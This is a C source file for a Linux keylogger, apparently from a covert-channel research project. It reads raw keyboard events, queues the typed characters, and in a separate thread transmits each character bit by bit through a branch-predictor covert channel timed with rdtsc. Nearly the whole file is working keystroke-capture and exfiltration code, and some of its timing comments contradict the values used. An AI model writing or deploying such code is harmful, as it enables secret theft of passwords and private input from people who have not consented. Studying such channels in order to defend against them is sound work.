#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <time.h>
#include <stdint.h>
#include <stddef.h> 
#include <sys/types.h>
#include "keylogger.h"
#include <errno.h>
#include <fcntl.h>
#include "queue.c"
#include <pthread.h>

#define BUFFER_SIZE 100
#define NUM_KEYCODES 71


extern void br_taken();		//These functions are in assembly files
extern void br_nottaken();	//This lets the compiler know that.

void* transmit(void* queue_ptr);

const char BACKSPACE[] = {(char)(0b00001000), (char)0b00000000};
const char ESC[] = {(char)0b00011011, (char)0b00000000};

const char *keycodes[] = {
    "RESERVED",
    ESC,
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    BACKSPACE,/*"BACKSPACE",*/ 
    "TAB",
    "q",
    "w",
    "e",
    "r",
    "t",
    "y",
    "u",
    "i",
    "o",
    "p",
    "[",
    "]",
    "ENTER",
    "LEFTCTRL",
    "a",
    "s",
    "d",
    "f",
    "g",
    "h",
    "j",
    "k",
    "l",
    ";",
    "\'",
    "`",
    "LEFTSHIFT",
    "\\",
    "z",
    "x",
    "c",
    "v",
    "b",
    "n",
    "m",
    ",",
    ".",
    "/",
    "RIGHTSHIFT",
    "*",
    "LEFTALT",
    " ",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

int loop = 1;

uint64_t rdtsc(){		// THe rdtsc function returns system time.
    uint32_t lo, hi;
    __asm__ __volatile__ (
                          "xorl %%eax,%%eax \n        cpuid"
                          ::: "%rax", "%rbx", "%rcx", "%rdx");
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return (uint64_t)hi << 32 | lo;
}


void keylogger(int keyboard){
//This function runs continuously, reading from the keyboard event file.
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int i;

    //Create a thread-safe queue to hold the keyboard readings.    
    Queue* queue = initQueue();

    //Create a thread that will transmit the characters in the queue
    // through the BPT channel.
    pthread_t transmitThread;
    pthread_create(&transmitThread, NULL, transmit, queue);

    while(loop){
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);
        for(i = 0; i < (bytesRead / eventSize); ++i){
            if(events[i].type == EV_KEY){
                if(events[i].value == 1){
                    if(events[i].code > 0 && events[i].code < NUM_KEYCODES){                        
                        enqueue(queue, keycodes[events[i].code]);
                    }
                }
            }
        }
    }
}


void* transmit(void* queue_ptr){
	uint64_t currentTime;
	uint64_t endTime;
	uint64_t second = 5000000000;

    Queue* queue = (Queue*)queue_ptr;
    
    const char* data;

    int j = 0;
	
    while(1){
        data = head(queue);    
        while(*data){
        	for(j = 7; j >=0; --j){
        		//refresh the current time
        		currentTime = rdtsc(); 
        		//The end time is 2 seconds after the current
        		endTime = currentTime + second;	
        		//For one second, fill the BPT with a 
        		//1 or 0 depending on the bit
                while(currentTime < endTime){
        			//If the jth bit is '1', fill with taken branches
        			if(*data & (1<<j)) br_taken();                    
        			//If 0, fill with not-taken branches.
        			else br_nottaken();                      
        			//Update the current time 
        			currentTime = rdtsc();
        		}
        	}
            //Iterate to the next char in the keystroke identifier
            data += 1;
        }
        dequeue(queue);        
    }
	return NULL;
}